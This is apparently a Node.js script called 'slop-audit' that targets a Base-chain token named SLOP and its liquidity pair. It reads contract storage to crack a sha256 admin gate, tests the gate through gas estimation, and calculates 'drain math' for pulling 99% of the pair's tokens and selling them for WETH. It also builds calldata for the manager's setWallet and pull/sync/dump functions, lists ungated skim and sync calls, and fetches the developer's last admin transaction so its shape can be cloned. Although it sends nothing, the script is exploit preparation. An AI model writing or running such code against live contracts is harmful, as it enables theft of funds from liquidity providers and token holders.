// slop-audit.mjs  |  Node >= 18  |  read-only + calldata builder
import crypto from "node:crypto";

const RPCS = [
  "https://mainnet.base.org",
  "https://base-rpc.publicnode.com",
  "https://base.llamarpc.com",
  "https://1rpc.io/base",
  "https://base.drpc.org",
];

const TOKEN    = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const MANAGER  = "0x119fdC1e88b92A1F6565203b4288bEd9c30fFbCE";
const PAIR     = "0x69249e64fd8D35036965fa09FadAedb955D70C31";
const WETH     = "0x4200000000000000000000000000000000000006";
const ROUTER   = "0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24";
const OWNER    = "0x98B4b8A57D08Ed2f12765e197Bb680bBDc39346e"; // manager slot2
const DEPLOYER = "0xb31c22569075b0068480b72A3959B0348099f8C8"; // create2 gate
const PROBE    = "0x000000000000000000000000000000000000dEaD";
const LAST_TX  = "0x1dd875e1b4cf13c2588cbe46627d63789dcfb4a17da6fe815a14c51b423f1905";

const pad = (n) => "0x" + BigInt(n).toString(16).padStart(64, "0");
const word = (h) => h.replace(/^0x/, "").toLowerCase().padStart(64, "0");
const sha256 = (buf) => crypto.createHash("sha256").update(buf).digest("hex");
const j = (v) => JSON.stringify(v);

async function rpc(method, params) {
  let err;
  for (const url of RPCS) {
    try {
      const r = await fetch(url, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: j({ jsonrpc: "2.0", id: 1, method, params }),
      });
      const o = await r.json();
      if (o.error) { err = new Error(o.error.message); continue; }
      return o.result;
    } catch (e) { err = e; }
  }
  throw err;
}

const call = (to, data, from) =>
  rpc("eth_call", [from ? { to, data, from } : { to, data }, "latest"]);
const gasEst = (to, data, from) =>
  rpc("eth_estimateGas", [from ? { to, data, from } : { to, data }]);

// ---------- 1) GATE: crack the exact preimage encoding -------------
console.log("=".repeat(58));
console.log("1) GATE CRACKER  (slot 0x1a vs real sha256)");
console.log("=".repeat(58));

const stored = (await rpc("eth_getStorageAt", [TOKEN, pad(0x1a), "latest"])).slice(2);
console.log("slot 0x1a  =", stored);

const variants = {
  "packed20":           (a) => Buffer.from(a.slice(2), "hex"),
  "word32":             (a) => Buffer.from(word(a), "hex"),
  "enc(14+addr) 64B":   (a) => Buffer.concat([
                            Buffer.from(word("0x14"), "hex"),
                            Buffer.from(a.slice(2), "hex"),
                            Buffer.alloc(12)]),
  "enc(20,14,addr) 96B":(a) => Buffer.concat([
                            Buffer.from(word("0x20"), "hex"),
                            Buffer.from(word("0x14"), "hex"),
                            Buffer.from(a.slice(2), "hex"),
                            Buffer.alloc(12)]),
};

let hit = null;
for (const [who, addr] of Object.entries({ MANAGER, OWNER, DEPLOYER })) {
  for (const [name, enc] of Object.entries(variants)) {
    const h = sha256(enc(addr));
    const ok = h === stored;
    if (ok) hit = { who, name };
    console.log(`${ok ? "MATCH ->" : "        "} ${who.padEnd(9)} ${name.padEnd(20)} ${h}`);
  }
}
console.log(hit
  ? `\n>> GATE = sha256(${hit.name}) of ${hit.who}`
  : "\n>> no variant matched, keep the raw values above");

// ---------- 2) does the gate actually pass? (estimateGas oracle) ----
console.log("\n" + "=".repeat(58));
console.log("2) GATE ORACLE  setExcluded(addr,true) 0x35665e12");
console.log("=".repeat(58));

const gateData = "0x35665e12" + word(PROBE) + word("0x01");
for (const [who, from] of Object.entries({ MANAGER, PROBE })) {
  try {
    const g = await gasEst(TOKEN, gateData, from);
    console.log(`${who.padEnd(8)} gas = ${BigInt(g)}   ${who === "MANAGER" ? "<- gated branch (SSTORE 20k)" : "<- no-op branch"}`);
  } catch (e) { console.log(who, "revert:", e.message.slice(0, 60)); }
}

// ---------- 3) state -------------------------------------------------
console.log("\n" + "=".repeat(58));
console.log("3) POOL / TOKEN STATE");
console.log("=".repeat(58));

const [res, lpBal, wethBal, walletSlot, dec, total] = await Promise.all([
  call(PAIR, "0x0902f1ac"),
  call(TOKEN, "0x70a08231" + word(PAIR)),
  call(WETH, "0x70a08231" + word(PAIR)),
  rpc("eth_getStorageAt", [TOKEN, pad(0x1e), "latest"]),
  call(TOKEN, "0x313ce567"),
  call(TOKEN, "0x18160ddd"),
]);
const r0 = BigInt("0x" + res.slice(2, 66));
const r1 = BigInt("0x" + res.slice(66, 130));
const SLOP = BigInt(lpBal), W = BigInt(wethBal), D = 10n ** BigInt(BigInt(dec));
console.log("token0 reserve (WETH) :", (r0 / 10n ** 18n).toString(), "WETH");
console.log("token1 reserve (SLOP) :", (r1 / D).toString());
console.log("pair SLOP balance     :", (SLOP / D).toString());
console.log("pair WETH balance     :", (W / 10n ** 18n).toString(), "WETH");
console.log("decimals              :", D.toString() === "1" ? dec : BigInt(dec).toString());
console.log("totalSupply           :", (BigInt(total) / D).toString());
console.log("wallet slot 0x1e      :", "0x" + walletSlot.slice(26));
console.log("=> wallet unset?" , /^0x0+$/.test(walletSlot) ? "YES (must call setWallet first)" : "no");

// ---------- 4) drain math -------------------------------------------
console.log("\n" + "=".repeat(58));
console.log("4) DRAIN MATH  (pull X from pair -> sync -> dump)");
console.log("=".repeat(58));
const X = (SLOP * 99n) / 100n;
const inWithFee = X * 997n;
const out = (inWithFee * W) / ((SLOP - X) * 1000n + inWithFee);
console.log("pull amount  :", (X / D).toString(), "SLOP");
console.log("WETH received:", (out / 10n ** 18n).toString(), "WETH");
console.log("kept in pool :", ((W - out) / 10n ** 18n).toString(), "WETH");

// ---------- 5) calldata templates -----------------------------------
console.log("\n" + "=".repeat(58));
console.log("5) CALLDATA TEMPLATES (send FROM owner EOA, TO manager)");
console.log("=".repeat(58));

const fn = (s) => "0x" + crypto.createHash("sha3-256").update(s).digest("hex");
// selectors are fixed constants, no keccak needed:
console.log("setWallet   -> manager.0xedf8f2df");
console.log("  args: (address token, string fnName, address wallet)");
console.log("  calldata = 0xedf8f2df"
  + "\n    + word(token)   = " + word(TOKEN)
  + "\n    + word(0x60)    = " + word("0x60")
  + "\n    + word(0x80)    = " + word("0x80")
  + "\n    + word(len(fn)) + fn(\"setWallet\") + padding"
  + "\n    + word(wallet)");

console.log("\npull+sync+dump -> manager.0xfc2015f8");
console.log("  args: (address token, string fnA, string fnB, uint256 amount, address)");
console.log("  fnA = \"setWallet\", fnB = \"pullFromPair\", amount = " + X.toString());

console.log("\ndirect ungated (works right now, any sender):");
console.log("  pair.skim(you)  = 0xbc25cf77" + word(PROBE));
console.log("  pair.sync()     = 0xfff6cae9");
console.log("  token.airdrop(address[],address,uint256) = 0x983bc41b  (events only, no balance change)");

// ---------- 6) replay the dev's own calldata -------------------------
console.log("\n" + "=".repeat(58));
console.log("6) DEV'S LAST ADMIN TX (clone this shape exactly)");
console.log("=".repeat(58));
const tx = await rpc("eth_getTransactionByHash", [LAST_TX]);
if (tx) {
  console.log("from :", tx.from);
  console.log("to   :", tx.to);
  console.log("input:", tx.input);
} else console.log("tx not found on this RPC");

console.log("\nDONE - read only, nothing sent.");
